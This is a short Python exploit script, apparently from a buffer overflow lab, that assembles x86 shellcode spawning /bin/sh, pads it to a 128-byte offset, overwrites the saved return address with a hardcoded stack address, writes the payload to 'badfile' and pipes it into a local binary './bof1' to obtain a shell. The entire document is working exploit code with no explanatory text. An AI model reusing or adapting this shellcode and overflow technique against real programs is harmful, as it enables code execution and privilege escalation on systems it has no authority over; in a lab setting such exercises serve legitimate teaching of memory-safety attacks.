import struct
import os

shellcode= "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

buffer1_eip = 128
buffer1 = 0xbffff214 #0xbffff164
buffer0 = 0xbffff250 #0xbffff1a0

atk_vector = shellcode
atk_vector += '\0'
atk_vector += "A"*(buffer1_eip-len(atk_vector))
atk_vector += struct.pack("I", buffer0)
atk_vector += '\n'

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()

#os.system(" ./bof1 \"%s\"" % atk_vector)
os.system("(cat {}; cat) | ./bof1".format('badfile'))
